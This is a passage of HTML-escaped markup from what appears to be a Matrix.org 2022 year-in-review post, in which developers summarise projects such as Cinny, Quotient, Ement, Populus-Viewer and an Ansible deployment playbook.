&lt;p&gt;This past year I have worked on several projects using Matrix:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;gitlab.com&#x2F;imbev&#x2F;matrix-rss-bridge&quot;&gt;matrix-rss-bridge&lt;&#x2F;a&gt;
&lt;ul&gt;
&lt;li&gt;This is a bot that can be configured to watch RSS&#x2F;Atom feeds and relay to Matrix rooms. It is written in Python, configured with a single &lt;code&gt;config.toml&lt;&#x2F;code&gt;, and licensed under the GPLv3.&lt;&#x2F;li&gt;
&lt;li&gt;I don&#x27;t actively work on it, however I will review and merge contributions that improve the project.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;gitlab.com&#x2F;imbev&#x2F;matrix-debate-bot&quot;&gt;matrix-debate-bot&lt;&#x2F;a&gt;
&lt;ul&gt;
&lt;li&gt;This is a bot that &amp;quot;moderates&amp;quot; discussion in Matrix rooms. It does nothing more than provide a signal every 2 minutes. Also in Python, interacted with via &amp;quot;command&amp;quot; messages, and licensed under the GPLv3.&lt;&#x2F;li&gt;
&lt;li&gt;Same thing as the previous project :)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;gitlab.com&#x2F;imbev&#x2F;matrix-quicksetup&quot;&gt;matrix-quicksetup&lt;&#x2F;a&gt;
&lt;ul&gt;
&lt;li&gt;This is a docker compose file and a few config files to help setup a Matrix homeserver and client. The homeserver setup is Conduit, and the client is Cinny. I don&#x27;t advise that anyone use this in a serious deployment, but if you want to quickly test Matrix entirely on your local machine, this may be useful.&lt;&#x2F;li&gt;
&lt;li&gt;Same as previous&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;codeberg.org&#x2F;imbev&#x2F;simplematrixbotlib&quot;&gt;simplematrixbotlib&lt;&#x2F;a&gt;
&lt;ul&gt;
&lt;li&gt;This is an easy to use bot library for the Matrix ecosystem written in Python. Having taken ownership of the project, I maintain the project with help from @kim:sosnowkadub.de, @moanos:hyteck.de, and others. Thank you for your contributions!&lt;&#x2F;li&gt;
&lt;li&gt;While I anticipate releasing version 3 of simplematrixbotlib, this next project has captured my focus recently.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;codeberg.org&#x2F;imbev&#x2F;matrix-social&quot;&gt;matrix-social&lt;&#x2F;a&gt;
&lt;ul&gt;
&lt;li&gt;matrix-social is a Matrix &amp;quot;Social Media&amp;quot; client. It is a webapp written in Rust using WASM, Yew, and the Matrix Rust SDK. Inspired by the design of Reddit, matrix-social will provide a similar experience, but based entirely upon Matrix. By providing seamless interoperability with Matrix chat clients, matrix-social will extend the Matrix ecosystem without dividing it. matrix-social currently lacks crucial features that will be added soon.&lt;&#x2F;li&gt;
&lt;li&gt;I actively develop matrix-social and will be doing so for the foreseeable future. At the moment, I am porting the styling from the Bulma CSS framework to TailwindCSS for greater control. If you&#x27;d like to try out the current state of matrix-social, &lt;a href=&quot;https:&#x2F;&#x2F;imbev.codeberg.page&#x2F;matrix-social&#x2F;&quot;&gt;https:&#x2F;&#x2F;imbev.codeberg.page&#x2F;matrix-social&#x2F;&lt;&#x2F;a&gt; is available. Join us in the Matrix room &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#matrix-social:matrix.org&quot;&gt;#matrix-social:matrix.org&lt;&#x2F;a&gt; !&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Kitsune&#x27;s year in Matrix&lt;&#x2F;h2&gt;
&lt;p&gt;Kitsune, one of the Spec Core Team members and maintainer of the Quotient client for Matrix, gives an update about their work this year as well as some new projects.&lt;&#x2F;p&gt;
&lt;p&gt;kitsune mentions&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;This year hasn&#x27;t been very productive for me (not in Matrix at least) but a few things are worth a mention.&lt;&#x2F;p&gt;
&lt;h3&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;quotient-im&quot;&gt;Quotient&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;This year I finally got to diving into the (new) E2EE code for libQuotient that NeoChat fellows started writing back in 2021, and was quite happy to end up collaborating with &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;@tobiasfella:kde.org&quot;&gt;Tobias Fella&lt;&#x2F;a&gt; on making it even better, all the way to merging and releasing way overdue libQuotient 0.7.0. The best news for me in all this was not even getting E2EE to its first actually usable release but the fact that libQuotient is no more a one man show. And now that there&#x27;s yet another libQuotient-based client (with much more solid traction than any client before), there&#x27;s hope that the project will move on at a somewhat steadier pace.&lt;&#x2F;p&gt;
&lt;h3&gt;Spec Core Team&lt;&#x2F;h3&gt;
&lt;p&gt;I did my share of MSC reviews (much fewer than I&#x27;d like to) and carried on with my role of ensuring Element doesn&#x27;t throw too much weight behind its contributions (although there are a few other people in SCT who seriously push for neutrality in things we work on; so that role is rather formal). One thing that I unfortunately did not find enough time to help with this year but I&#x27;m sure we&#x27;ll make it happen in 2023 is to move our API definitions from Swagger (v2) to OpenAPI v3, ditching all the Swagger extensions we had to add - thanks to &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;zecakeh&quot;&gt;Kevin&lt;&#x2F;a&gt; for driving this home.&lt;&#x2F;p&gt;
&lt;h3&gt;CLUP.chat&lt;&#x2F;h3&gt;
&lt;p&gt;About a year ago I was contacted by folks who wanted to use Matrix as a backend to bridge WhatsApp, Signal and Telegram for scout (and other) communities in Germany and asked me to be their technical advisor. Less than a year later we went live (you can connect the groups &lt;a href=&quot;https:&#x2F;&#x2F;clup.chat&#x2F;&quot;&gt;here&lt;&#x2F;a&gt;), soon after ran into rate-limiting issues &lt;em&gt;outside&lt;&#x2F;em&gt; of Matrix (centralised networks, heh...), did the homework, and now busy making the whole thing worth charging money for. The backend is almost entirely vanilla code for Synapse and Mautrix-based bridges, plus a small website and a non-Matrix bot to onboard people.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Jae&#x27;s year of Matrix&lt;&#x2F;h2&gt;
&lt;p&gt;Jae gives an update about what they worked on this year.    &lt;a href=&quot;From&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Jae (Beep) shares&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;Yet another year well spent on Matrix, which was a bit more &lt;em&gt;dynamic&lt;&#x2F;em&gt; than the previous ones.&lt;br&#x2F;&gt;
From mitigating spam attacks to creating brand-new projects and also contributing to others, there&#x27;s no shortage of news.&lt;&#x2F;p&gt;
&lt;h3&gt;&lt;a href=&quot;https:&#x2F;&#x2F;sr.ht&#x2F;~jae&#x2F;cert-monitor&#x2F;&quot;&gt;cert-monitor&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;code&gt;cert-monitor&lt;&#x2F;code&gt; is a small program made entirely in vanilla Python that checks the validity of your SSL certificates and warn you when they are about to expire.&lt;br&#x2F;&gt;
The idea for it originated in a Matrix room in which the other administrator would usually forget to renew SSL (bringing down their homeserver).&lt;br&#x2F;&gt;
The software can send notifications to e-mails and Matrix and other methods are in the works like NTFy (but a bit on stale since Matrix support was the main goal).&lt;&#x2F;p&gt;
&lt;h3&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;3868&quot;&gt;MSC3868: Room Contribution&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;The MSC3868 (currently still a draft) is a spec proposal by me and Aminda to add a way for rooms to advertise easily official links like code repositories, ways to contribute to translations, donations and more but only showing to users inside the room.&lt;br&#x2F;&gt;
The start of it is that we noticed that usually users don&#x27;t even bother reading the topic&#x2F;MOTD of the room, which renders putting links inside of it just about useless in most cases.&lt;br&#x2F;&gt;
The proposal is still being refined, but the big lines are there already!&lt;&#x2F;p&gt;
&lt;h3&gt;&lt;a href=&quot;https:&#x2F;&#x2F;git.sr.ht&#x2F;~jae&#x2F;gh-bot&quot;&gt;gh-bot&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;code&gt;gh-bot&lt;&#x2F;code&gt; is a small bot made to be used with the webhook function of various Git forges (namely GitHub, GitLab and Gitea&#x2F;Forgejo).&lt;br&#x2F;&gt;
The bot itself is pretty simple and will just output new commits, new stars and build statuses in all the rooms the bot is.&lt;&#x2F;p&gt;
&lt;h3&gt;&lt;a href=&quot;https:&#x2F;&#x2F;git.sr.ht&#x2F;~jae&#x2F;hsl-matrix-notifier&quot;&gt;hsl-matrix-notifier&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;code&gt;hsl-matrix-notifier&lt;&#x2F;code&gt; has a bit of an exotic use case: it is made to track problems with the Helsinki public transports company and warn about potential disruptions.&lt;br&#x2F;&gt;
For now, it is very basic and is still being worked on to have a better version (like if no news, it will still post old stuff when I would like in term something more like an RSS feed).&lt;br&#x2F;&gt;
When I move, I&#x27;ll probably spin off this bot to make a local version or even build something, so it can be configured by city.&lt;&#x2F;p&gt;
&lt;hr&#x2F;&gt;
&lt;p&gt;In the end, this year has been a very dynamic one in the Matrix world, and I can&#x27;t wait to see what is coming next.&lt;br&#x2F;&gt;
For my part, I don&#x27;t intend to stop there, and I have even more Matrix related projects, so stay tuned!&lt;br&#x2F;&gt;
Oh also, I almost forgot, happy new year Matrixians, stay awesome!&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Cinny&lt;&#x2F;h2&gt;
&lt;p&gt;Cinny is a Matrix client for instant messaging. Our main goal is to make the best UI&#x2F;UX so that less technical folks can easily adopt Matrix. &lt;a href=&quot;https:&#x2F;&#x2F;cinny.in&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;ajbura shares&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;Cinny is a Matrix client for instant messaging. Our main goal is to make the best UI&#x2F;UX so that less technical folks can easily adopt Matrix.&lt;br&#x2F;&gt;2022 has been really productive year for Cinny, we have landed Full Spaces support, Room settings, Custom emojis and stickers, Session verification and cross-signing, and so many cool features.&lt;&#x2F;p&gt;&lt;p&gt;Lately, we have been working on a design system for Cinny and it is almost ready to release. Our short-term goals for 2023 would be to incorporate the design system into Cinny, and convert the code to TypeScript both of which will greatly improve the developer and user experience.&lt;&#x2F;p&gt;&lt;p&gt;You can join &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#cinny-space:matrix.org&quot;&gt;Cinny space&lt;&#x2F;a&gt; to talk about it or browse &lt;a href=&quot;https:&#x2F;&#x2F;cinny.in&quot;&gt;https:&#x2F;&#x2F;cinny.in&lt;&#x2F;a&gt; &lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;matrix.org_nIQXMyDqrhZmlzaPlmcPHPKV.png&quot; style=&quot;display: inline-block;&quot;&#x2F;&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2&gt;2022 year in Nyatrix&lt;&#x2F;h2&gt;
Nyaoori gives us an update about their various Matrix related projects.
&lt;p&gt;Nyaaori ⚛️ tells us&lt;&#x2F;p&gt;&lt;blockquote&gt;
      &lt;ul&gt;
        &lt;li&gt;Initial workings on spec.cat
          &lt;ul&gt;
            &lt;li&gt;Intended to be a community-driven extension specification to allow for easier collaboration and client&#x2F;server integration prior to submitting an MSC&lt;&#x2F;li&gt;
            &lt;li&gt;Would allow for finalising community things even if they get little to no attention from SCT&lt;&#x2F;li&gt;
            &lt;li&gt;Eventually will take over maintenance of Catalyst&lt;&#x2F;li&gt;
          &lt;&#x2F;ul&gt;
        &lt;&#x2F;li&gt;
        &lt;li&gt;Initial work on decentralised trust&#x2F;moderation system
          &lt;ul&gt;
            &lt;li&gt;Should work on under any federated system, not just matrix&lt;&#x2F;li&gt;
            &lt;li&gt;Intended to reduce workload on moderators&#x2F;admins&lt;&#x2F;li&gt;
            &lt;li&gt;Makes use of a web of trust system, with each user or server being their own center of trust&lt;&#x2F;li&gt;
          &lt;&#x2F;ul&gt;
        &lt;&#x2F;li&gt;
        &lt;li&gt;Catalyst (fork of conduit) progress
          &lt;ul&gt;
            &lt;li&gt;Cacophony
              &lt;ul&gt;
                &lt;li checked=&quot;false&quot;&gt;
                  &lt;p&gt;Implementation of Discord C2S inside a matrix homeserver&lt;&#x2F;p&gt;
                &lt;&#x2F;li&gt;
                &lt;li checked=&quot;false&quot;&gt;
                  &lt;p&gt;Marginally modified Discord web client can connect to it&lt;&#x2F;p&gt;
                &lt;&#x2F;li&gt;
              &lt;&#x2F;ul&gt;
            &lt;&#x2F;li&gt;
            &lt;li&gt;Partial Dendrite API support
              &lt;ul&gt;
                &lt;li checked=&quot;false&quot;&gt;
                  &lt;p&gt;Allows using TARDIS&lt;&#x2F;p&gt;
                &lt;&#x2F;li&gt;
              &lt;&#x2F;ul&gt;
            &lt;&#x2F;li&gt;
            &lt;li&gt;Room V10 support
              &lt;ul&gt;
                &lt;li checked=&quot;false&quot;&gt;
                  &lt;p&gt;=&amp;gt; Upstreamed to Conduit&lt;&#x2F;p&gt;
                &lt;&#x2F;li&gt;
              &lt;&#x2F;ul&gt;
            &lt;&#x2F;li&gt;
            &lt;li&gt;Support for private read receipts
              &lt;ul&gt;
                &lt;li checked=&quot;false&quot;&gt;
                  &lt;p&gt;=&amp;gt; Upstream in progress&lt;&#x2F;p&gt;
                &lt;&#x2F;li&gt;
                &lt;li&gt;Partial support for displaying space hierarchies&lt;&#x2F;li&gt;
              &lt;&#x2F;ul&gt;
            &lt;&#x2F;li&gt;
            &lt;li&gt;Backfill to other servers via S2S
              &lt;ul&gt;
                &lt;li checked=&quot;false&quot;&gt;
                  &lt;p&gt;=&amp;gt; Upstream in progress&lt;&#x2F;p&gt;
                &lt;&#x2F;li&gt;
              &lt;&#x2F;ul&gt;
            &lt;&#x2F;li&gt;
            &lt;li&gt;Code refactor alongside Conduit&lt;&#x2F;li&gt;
            &lt;li&gt;Many minor bug fixes
              &lt;ul&gt;
                &lt;li checked=&quot;false&quot;&gt;
                  &lt;p&gt;=&amp;gt; Most upstreamed&lt;&#x2F;p&gt;
                &lt;&#x2F;li&gt;
              &lt;&#x2F;ul&gt;
            &lt;&#x2F;li&gt;
          &lt;&#x2F;ul&gt;
        &lt;&#x2F;li&gt;
        &lt;li&gt;Initial research into designing my own matrix client
          &lt;ul&gt;
            &lt;li&gt;Intended to be extensible&lt;&#x2F;li&gt;
            &lt;li&gt;Plugins&#x2F;extensions should be installable via matrix itself&lt;&#x2F;li&gt;
            &lt;li&gt;Eventually will be spec.cat&amp;apos;s reference client&lt;&#x2F;li&gt;
          &lt;&#x2F;ul&gt;
        &lt;&#x2F;li&gt;
      &lt;&#x2F;ul&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Ement&lt;&#x2F;h2&gt;
&lt;p&gt;Ement or ement.el is a Matrix client for GNU Emacs, the classic-yet-ever-new text editor and Lisp environment. &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;alphapapa&#x2F;ement.el&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;alphapapa contributes&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;alphapapa&#x2F;ement.el&quot;&gt;Ement&lt;&#x2F;a&gt; is a Matrix client for &lt;a href=&quot;https:&#x2F;&#x2F;www.gnu.org&#x2F;software&#x2F;emacs&#x2F;&quot;&gt;GNU Emacs&lt;&#x2F;a&gt;, the classic-yet-ever-new text editor and Lisp environment.  After a couple of years of off-and-on development, 2022 saw the first versioned release, published to &lt;a href=&quot;https:&#x2F;&#x2F;elpa.gnu.org&#x2F;&quot;&gt;GNU ELPA&lt;&#x2F;a&gt;, the official Emacs package repository (so it&#x27;s installable into Emacs &quot;out-of-the-box,&quot; without any additional configuration).
&lt;&#x2F;p&gt;
&lt;p&gt;
This development was enabled by the maturation and publishing of Ement&#x27;s underlying HTTP library, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;alphapapa&#x2F;plz.el&quot;&gt;plz&lt;&#x2F;a&gt;, also to ELPA.  And another library, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;alphapapa&#x2F;taxy.el&quot;&gt;taxy&lt;&#x2F;a&gt;, used in Ement for organizing rooms into meaningful groups for the UI, was also released to ELPA.
&lt;&#x2F;p&gt;
&lt;p&gt;
Along the way, Ement gained useful features like a helpful command menu based on the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;magit&#x2F;transient&quot;&gt;Transient&lt;&#x2F;a&gt; library (the one used in &lt;a href=&quot;https:&#x2F;&#x2F;magit.vc&#x2F;&quot;&gt;Magit&lt;&#x2F;a&gt;, the popular Emacs frontend to git), the ability to show and send images, files, and reactions, read receipts, room directories and searching, an improved notification system, fancy, configurable room grouping provided by &lt;code&gt;taxy&lt;&#x2F;code&gt;, and many other improvements and fixes.
&lt;&#x2F;p&gt;
&lt;p&gt;
As well, although Ement doesn&#x27;t support E2EE natively, users have successfully used it via &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;pantalaimon&quot;&gt;Pantalaimon&lt;&#x2F;a&gt;, the E2EE proxy daemon, allowing Ement to be used with encrypted rooms.
&lt;&#x2F;p&gt;
&lt;p&gt;
Altogether, Ement now provides a stable, reliable client for Emacs users to &quot;jack in&quot; to the Matrix.  Users and interested parties are invited to join the chat room, &lt;code&gt;#ement.el:matrix.org&lt;&#x2F;code&gt;, where users help each other and announcements are made.
&lt;&#x2F;p&gt;
&lt;p&gt;
Looking forward to 2023, it&#x27;s planned to improve support for newer versions of the client-server spec.  Sliding-sync support will be especially helpful for improving initial sync times, and the new event-to-timestamp endpoints will aid in searching room events and paging back in history by date.  As well, the next stable release of Emacs, version 29, will include native SQLite support, and the author looks forward to investigating how that might be helpful for Ement (e.g. caching events locally, similar to Element).
&lt;&#x2F;p&gt;
&lt;p&gt;
And as always, like Emacs, Ement is Free Software, so contributions are welcome.  Feel free to submit bug reports, feature requests, and other feedback on the repo&#x27;s issue tracker and in the chat room.&lt;&#x2F;p&gt;&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Matrix Highlight&lt;&#x2F;h2&gt;
&lt;p&gt;Matrix Highlight is a web annotation tool based on Matrix. It allows you to select and highlight text on webpages, as well as comment on it. Because it&#x27;s built on Matrix, you can keep this information hosted on your own hardware, and highlight pages together with other users. &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;DanilaFe&#x2F;matrix-highlight&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Daniel mentions&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;Matrix Highlight is a web annotation tool based on Matrix. It allows you to select and highlight text on webpages, as well as comment on it. Because it&#x27;s built on Matrix, you can keep this information hosted on your own hardware, and highlight pages together with other users.&lt;&#x2F;p&gt;
&lt;p&gt;This year, Matrix Highlight switched to manifest V2. This is a browser extension version format supported by Firefox (Chrome too, but not for the web store). Now, you can highlight pages from Firefox! In addition to this, the project switched to using a shadow DOM for styling its UI elements, which makes it significantly less likely to be affected by the style and design of the webpage it&#x27;s running on.&lt;&#x2F;p&gt;
&lt;p&gt;You can find Matrix Highlight on its &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;DanilaFe&#x2F;matrix-highlight&quot;&gt;GitHub page&lt;&#x2F;a&gt; or read about it in the &lt;a href=&quot;https:&#x2F;&#x2F;danilafe.com&#x2F;blog&#x2F;introducing_highlight&#x2F;&quot;&gt;introductory blog post&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Populus-Viewer&lt;&#x2F;h2&gt;
&lt;p&gt;Populus-Viewer is a social annotation tool, powered by Matrix. It lets you attach Matrix chats to PDFs, images, videos, and audio files. &lt;a href=&quot;https:&#x2F;&#x2F;opentower.github.io&#x2F;populus-viewer&#x2F;&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;gleachkr tells us&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;Populus-Viewer is a social annotation tool, powered by Matrix. It lets you attach Matrix chats to PDFs, images, videos, and audio files.&lt;&#x2F;p&gt;&lt;p&gt;It&amp;#x27;s been a big year for populus! Since last January, we&amp;#x27;ve seen huge improvements in usability, appearance, and Matrix feature support, that have taken populus from a fun experiment to a useful tool (though we&amp;#x27;re still considering ourselves in beta). The topline item is that we&amp;#x27;ve achieved our original goal of supporting matrix-powered social annotation of PDFs and audiovisual media. So what&amp;#x27;s left to do?&lt;&#x2F;p&gt;&lt;p&gt;Here are some ideas for the New Year.&lt;&#x2F;p&gt;&lt;ul&gt;&lt;li&gt;Let&amp;#x27;s add support for annotating web files: HTML (out on the web) and WARC (web archives, stored as files on matrix).&lt;&#x2F;li&gt;&lt;li&gt;Let&amp;#x27;s add widget support for populus chats, so you can annotate your documents with all sorts of matrix-powered tools.&lt;&#x2F;li&gt;&lt;li&gt;Let&amp;#x27;s get moving on &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;3775&quot;&gt;the&lt;&#x2F;a&gt; &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;3752&quot;&gt;social&lt;&#x2F;a&gt; &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;3592&quot;&gt;annotation&lt;&#x2F;a&gt; &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;3574&quot;&gt;MSCs&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;&lt;li&gt;Stickers?&lt;&#x2F;li&gt;&lt;&#x2F;ul&gt;&lt;p&gt;If you&amp;#x27;d like to talk about any of these ideas, or add some of your own, come join us at: &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;%23opentower%3Amatrix.org&quot;&gt;#opentower:matrix.org&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;&lt;&#x2F;blockquote&gt;
&lt;!-- Stuff I forgot because I didn&#x27;t tag it... --&gt;
&lt;h2&gt;Aminda&#x27;s matrix update&lt;&#x2F;h2&gt;
&lt;p&gt;Aminda (she&#x2F;they 🏳️‍⚧️ MSC1769|MSC3189) reports&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;so I have been doing&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;gitea.blesmrt.net&#x2F;mikaela&#x2F;gist&#x2F;commits&#x2F;branch&#x2F;master&#x2F;matrix&quot;&gt;https:&#x2F;&#x2F;gitea.blesmrt.net&#x2F;mikaela&#x2F;gist&#x2F;commits&#x2F;branch&#x2F;master&#x2F;matrix&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;git.piraattipuolue.fi&#x2F;Pikaviestimet&#x2F;Pikaviestimet&#x2F;commits&#x2F;branch&#x2F;master&#x2F;matrix&quot;&gt;https:&#x2F;&#x2F;git.piraattipuolue.fi&#x2F;Pikaviestimet&#x2F;Pikaviestimet&#x2F;commits&#x2F;branch&#x2F;master&#x2F;matrix&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Mikaela&#x2F;mikaela.github.io&#x2F;commits&#x2F;master&#x2F;blog&#x2F;_posts&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;Mikaela&#x2F;mikaela.github.io&#x2F;commits&#x2F;master&#x2F;blog&#x2F;_posts&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Mikaela&#x2F;mikaela.github.io&#x2F;commits&#x2F;master&#x2F;pages&#x2F;matrix.markdown&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;Mikaela&#x2F;mikaela.github.io&#x2F;commits&#x2F;master&#x2F;pages&#x2F;matrix.markdown&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Mikaela&#x2F;mikaela.github.io&#x2F;commits&#x2F;master&#x2F;txt&#x2F;matrix.txt&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;Mikaela&#x2F;mikaela.github.io&#x2F;commits&#x2F;master&#x2F;txt&#x2F;matrix.txt&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;&lt;&#x2F;blockquote&gt;
&lt;h2&gt;matrix-docker-ansible-deploy&lt;&#x2F;h2&gt;
&lt;p&gt;Matrix (An open network for secure, decentralized communication) server setup using Ansible and Docker &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Slavi tells us&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;For &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;&quot;&gt;matrix-docker-ansible-deploy&lt;&#x2F;a&gt;, 2022 started with &lt;strong&gt;breaking the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&quot;&gt;Synapse&lt;&#x2F;a&gt; monopoly&lt;&#x2F;strong&gt; by &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;blob&#x2F;master&#x2F;CHANGELOG.md#dendrite-support&quot;&gt;adding support&lt;&#x2F;a&gt; for the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendrite&quot;&gt;Dendrite&lt;&#x2F;a&gt; Matrix homeserver in early January. This required various internal changes so that the &lt;a href=&quot;https:&#x2F;&#x2F;www.ansible.com&#x2F;&quot;&gt;Ansible&lt;&#x2F;a&gt; playbook would not be Synapse-centric anymore. This groundwork paved the way for continuing in this direction and we &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;blob&#x2F;master&#x2F;CHANGELOG.md#conduit-support&quot;&gt;added support&lt;&#x2F;a&gt; for &lt;a href=&quot;https:&#x2F;&#x2F;conduit.rs&#x2F;&quot;&gt;Conduit&lt;&#x2F;a&gt; in August.&lt;&#x2F;p&gt;
&lt;p&gt;When it comes to the &lt;code&gt;matrix-docker-ansible-deploy&lt;&#x2F;code&gt; Ansible playbook, 2022 was the year of the non-Synapse homeserver implementation. In practice, none of these homeserver implementations seem ready for prime-time yet and there is no migration path when coming from Synapse. Having done our job of adding support for these alternative homeserver implementations, we can say that we&#x27;re not getting in the way of future progress. It&#x27;s time for the Dendrite developers to push harder (development-wise) and for the Synapse developers to take a well-deserved long (infinite) break, and we may get to see more people migrating away from Synapse in the next year(s).&lt;&#x2F;p&gt;
&lt;p&gt;Support for the following new &lt;strong&gt;bridges&lt;&#x2F;strong&gt; was added:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;blob&#x2F;master&#x2F;CHANGELOG.md#postmoogle-email-bridge-support&quot;&gt;Postmoogle&lt;&#x2F;a&gt; for bi-directional email bridging, which supersedes my old and simplistic &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;devture&#x2F;email2matrix&quot;&gt;email2matrix&lt;&#x2F;a&gt; one-way bridge-bot&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;blob&#x2F;master&#x2F;CHANGELOG.md#mautrix-discord-support&quot;&gt;mautrix-discord&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
